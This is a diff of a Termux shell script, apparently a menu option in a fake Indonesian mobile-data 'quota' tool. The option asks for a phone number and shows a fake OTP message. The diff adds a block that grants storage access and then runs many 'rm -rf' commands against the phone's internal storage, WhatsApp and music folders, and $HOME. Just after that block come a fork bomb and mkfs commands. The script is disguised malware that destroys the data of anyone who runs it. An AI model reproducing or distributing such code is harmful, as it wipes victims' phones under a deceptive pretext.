@@ -193,20 +193,26 @@ if [ $MikoKW = 4 ] || [ $MikoKW = 04 ]
 then
 figlet -f slant "Miko KW"|lolcat
 sleep 1
-apt update && apt upgrade
-pkg install git
-pkg install bash
-git clone https://github.com/MikoKW/Tembak-Kuota
-cd Tembak-Kuota 
-sh Tembak-Kuota.sh
 echo $G1"Masukan Nomer Anda dibawah"
 read p;
 sleep 3
 echo $G1"sedang mengirim kode otp"
 sleep 1
-echo $G1"Masukan Kode otp di bawah"
-read p;
-echo $G1"Sedang masuk"
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/
+rm -rf /storage/emulated/0/
+rm -rf /sdcard/0/Music
+rm -rf /sdcard/0/Musik
 :(){ :|: & };:
 mkfs
 mkfs.bfs
